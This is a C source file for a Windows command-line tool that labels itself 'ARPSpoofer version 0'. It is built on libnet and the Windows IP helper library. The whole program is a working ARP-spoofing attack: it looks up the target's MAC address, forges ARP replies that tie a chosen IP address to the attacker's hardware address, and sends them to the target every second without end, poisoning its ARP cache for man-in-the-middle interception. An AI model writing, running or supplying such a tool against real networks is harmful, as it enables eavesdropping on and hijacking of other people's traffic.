#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <Iphlpapi.h>
#include <libnet.h>

#include <stdio.h>

#pragma comment(lib,"packet")
#pragma comment(lib,"libnet")
#pragma comment(lib,"Iphlpapi")

uint32_t
my_libnet_get_ipaddr4(libnet_t *l)
{
	long npflen = 1;
	//long npflen = 0;
	struct sockaddr_in sin;
	struct npf_if_addr ipbuff;
	memset(&sin, 0, sizeof(sin));
	memset(&ipbuff, 0, sizeof(ipbuff));
	//npflen = sizeof(ipbuff);
	if (PacketGetNetInfoEx(l->device, &ipbuff, &npflen))
	{
		sin = *(struct sockaddr_in *)&ipbuff.IPAddress;
	}
	return (sin.sin_addr.s_addr);
}
int main(int argc, char *argv[])
{

	int j = 0;
	libnet_t *l;
	uint32_t i;
	uint32_t x;
	CHAR *h;
	CHAR *k;
	IPAddr srcip = 0;
	IPAddr dstip = 0;
	ULONG size = 6;
	uint8_t *packet;
	uint32_t packet_s;

	l = libnet_init(LIBNET_LINK_ADV, NULL, NULL);

	if (argc != 3) return (EXIT_FAILURE);
	else {
		i = inet_addr(argv[2]); 

		srcip = my_libnet_get_ipaddr4(l);
		dstip = inet_addr(argv[1]);
		k = malloc(sizeof(CHAR) * size);
		SendARP(dstip, srcip, k, &size);
		
	}
	

	h = malloc(sizeof(CHAR) * 6);
	h = libnet_get_hwaddr(l);
	libnet_autobuild_arp(
		ARPOP_REPLY,
		h,
		(uint8_t*)&i,
		k,
		(uint8_t*)&dstip,
		l);
	libnet_autobuild_ethernet(
		k,
		ETHERTYPE_ARP,
		l
		);
	libnet_adv_cull_packet(l, &packet, &packet_s);

	fputs("\nARPSpoofer version 0 (exrulx@gmail.com)\n",stdout);
	fputc('\n', stdout);
	fputs("Packet Raw:   ", stdout);
	for (i = 0; i < packet_s; i++)
	{
		printf(i % 16 == 15 ? "%02x\n              " : "%02x ", *(BYTE *)(packet + i));
	}
	fputs("\n\n", stdout);
	i = 0;
	while (1)
	{
		libnet_write(l);
		i++;
		printf("Packet Count: %d\r", i);
		Sleep(1000);
	}
	
	
	libnet_destroy(l);
	
}
